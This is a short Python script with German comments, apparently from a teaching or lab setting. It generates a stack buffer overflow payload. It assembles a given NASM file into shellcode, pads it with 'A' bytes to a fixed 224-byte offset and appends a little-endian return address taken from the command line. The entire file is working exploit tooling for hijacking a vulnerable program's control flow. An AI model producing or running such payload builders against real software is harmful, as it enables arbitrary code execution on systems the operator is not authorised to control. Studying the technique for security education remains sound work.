#! /usr/bin/python3
import sys #sys modul importieren (für generelle Funktionen)
import codecs #codecs modul importieren (für unicode)
import os #os modul importieren (um Dateien zu öffnen)
import subprocess #subprocess modul importieren für subprocess.call() (Linux Pprgramme ausführen)
if len(sys.argv)==3: #Wenn 2 Argumente übergeben wurden
    try: #Versuche
        address=codecs.decode(sys.argv[1], "hex") #Hexadezimal zu Dezimal umwandeln
        address=address [::-1] #Umgekehrte Reihenfolge (Little Endian)
    except: #Wenn Fehler
        print("Bitte Adresse in Hexadezimal angeben!") #Hinweis ausgeben
        sys.exit(0) #Programm beenden

    if(os.path.isfile(sys.argv[2])): #Wenn Datei existiert
        path=sys.argv[2] #Dateipfad speichern
        subprocess.run(" nasm -f bin {} -o a.bin".format(path), 
        shell=True) #Ausführen von nasm -f bin {} -o a.bin als Kindprozess (asm-Datei in Binärdatei umwandeln)
        subprocess.run("./dumpshellcode.py a.bin > a.txt" ,
        shell=True)  #Ausführen von dumpshellcode.py a.bin > a.txt als Kindprozess (Binärdatei in nutzbaren Shellcode umwandeln und in "a.txt" schreiben)
    else: #Wenn Datei nicht existiert
        print("Datei existiert nicht!") #Hinweis ausgeben
        sys.exit(0) #Programm beenden

    f=open("a.txt","r+") #Datei a.txt öffnen, welche vorher erstellt wurde
    shellcode= f.read() #Datei a.txt in Zeichenkette "shellcode" schreiben
    shellcode=bytes(shellcode, 'utf-8') #Zeichenkette in Bytes umwandeln
    shellcode=shellcode.decode('unicode_escape').encode\
    ("raw_unicode_escape") #Doppelte Backslashs entfernen
    f.close() #Datei a.txt schließen

    os.system("rm a.txt") #Datei a.txt löschen
    os.system("rm a.bin") #Datei a.bin löschen

    padding_size= 224 - (len(shellcode))-\
    (int((len(sys.argv[1])/2))+2) #Paddinggröße berechnen
    os.write(1,shellcode + b"A" * padding_size + address) #Shellcode schreiben
else: #Wenn nicht 2 Argumente übergeben wurden
    print("Wie folgt zu Benutzen:", "Programmname:" ,sys.argv[0] , 
    "Bufferadresse", "Assemblerprogramm") #Hinweis ausgeben
    sys.exit(0) #Programm beenden